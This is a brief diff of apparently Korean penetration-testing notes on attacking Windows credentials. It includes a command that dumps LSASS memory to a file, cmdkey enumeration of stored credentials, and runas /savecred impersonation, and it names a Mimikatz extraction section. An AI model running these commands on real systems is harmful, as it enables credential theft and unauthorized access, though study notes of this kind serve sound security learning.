@@ -290,8 +290,8 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 
 ## Attacking Windows Credential Manager
 ### cmdkey로 자격 증명 열거
-```C:\Users\sadams>cmdkey /list```
-- SRV01\mcharles 사용자 가장 : ```C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd```
+```C:\>cmdkey /list```
+- SRV01\mcharles 사용자 가장 : ```C:\>runas /savecred /user:SRV01\mcharles cmd```
 
 ### Mimikatz를 사용하여 자격 증명 추출
 ```
